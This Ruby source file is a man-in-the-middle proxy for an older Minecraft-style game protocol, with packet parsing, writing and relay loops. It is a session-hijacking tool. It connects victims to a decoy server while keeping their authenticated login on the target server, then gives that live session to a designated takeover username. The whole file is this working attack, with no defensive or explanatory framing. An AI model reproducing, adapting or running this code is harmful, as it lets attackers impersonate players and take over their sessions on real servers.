# encoding: utf-8

class McConn
  # fields
  @@targets = []
    
  # constructor
  def initialize(sock)
    @csock = sock
    @tsock
    @dsock
    @lresp
    @mode = :login
  end

  def tsock
    @tsock
  end

  def lresp
    @lresp
  end

  def run
    # initial login
    packet = readPacket(@csock, :c_to_s)

    # check the username to see if it's our special user
    user = packet[1].split(/;/)[0]
    puts 'User: ' + user
    if user == TAKEOVER_USER then
      # takeover user

      # find a target
      while target = @@targets.pop
        # get socket
        @tsock = target.tsock

        # send rest of handshake
        writePacket(@csock,[0x02, prepString('-')],'Ca*')

        # read login packet
        readPacket(@csock, :c_to_s)

        # send back login target login packet
        writePacket(@csock, prepAllStrings(target.lresp), 'CNa*a*NNCCC')

        # start routing packets from the new client to the target server
        begin
          Thread::new() do
            loop do
              @tsock.sendmsg(@csock.recv(1000))
            end
          end
          loop do
            @csock.sendmsg(@tsock.recv(1000))
          end
        rescue
          puts 'Lost connection'
        ensure
          # close sockets
          @tsock.close
          @csock.close
        end

      end
    else
      # victim

      # open a new socket with the target host
      @tsock = TCPSocket.new(TARGET_HOST, TARGET_PORT)

      # open a new socket with the decoy host
      @dsock = TCPSocket.new(DECOY_HOST, DECOY_PORT)

      # send handshake packet to decoy
      writePacket(@dsock,[0x02, prepString(user+';'+DECOY_HOST+':'+DECOY_PORT.to_s)],'Ca*')

      # send handshake packet to target
      writePacket(@tsock,[0x02, prepString(user+';'+TARGET_HOST+':'+TARGET_PORT.to_s)],'Ca*')

      # read responce
      tresp = readPacket(@tsock,:s_to_c)
      dresp = readPacket(@dsock,:s_to_c)

      # send client target responce
      tresp[1] = prepString(tresp[1])
      writePacket(@csock,tresp,'Ca*')

      # read client response
      cresp = readPacket(@csock,:c_to_s)

      # send response to both servers
      cresp[2] = prepString(cresp[2])
      cresp[3] = prepString(cresp[3])
      writePacket(@tsock,cresp,'CNa*a*NNCCC')
      writePacket(@dsock,cresp,'CNa*a*NNCCC')

      # save target login packet
      puts 'read target login'
      @lresp = readPacket(@tsock, :s_to_c)

      # save target socket to list
      @@targets << self

      # start routing data to decoy server
      begin
        Thread::new() do
          loop do
            @dsock.sendmsg(@csock.recv(1000))
          end
        end
        loop do
          @csock.sendmsg(@dsock.recv(1000))
        end
      rescue
        puts 'Lost connection'
      ensure
        # close sockets
        @dsock.close
        @csock.close
      end
    end
  end

  private

  def prepAllStrings(packet)
    packet.map do |e|
      if e.instance_of? String then
        prepString(e)
      else
        e
      end
    end
  end

  def prepString(str)
    len = str.size
    [len, str.encode('UTF-16BE')].pack('na*')
  end

  def processPacket(packet)
    case packet[0]
    when 0x01 # login
    when 0x02 # handshake
    end
  end

  def writePacket(sock, packet, format)
    sock.write(packet.pack(format))
  end

  # read a single packet
  def readPacket(sock, dir)
    id = readByte(sock)
    packet = case id
    when 0x01 # login
      [id, readInt(sock), readString(sock), readString(sock),
        readInt(sock), readInt(sock), readByte(sock),
        readByte(sock), readByte(sock)]
    when 0x02 # handshake
      [id, readString(sock)]
    else nil
    end
  end

  # 1 byte
  def readByte(sock)
    sock.read(1).unpack('C')[0]
  end

  # 2 bytes
  def readShort(sock)
    sock.read(2).unpack('n')[0]
  end

  # 4 bytes
  def readInt(sock)
    sock.read(4).unpack('N')[0]
  end

  # variable lenght
  def readString(sock)
    len = readShort(sock)
    resp = sock.read(len*2)
    resp.force_encoding('UTF-16BE')
    resp.encode('UTF-8')
  end
end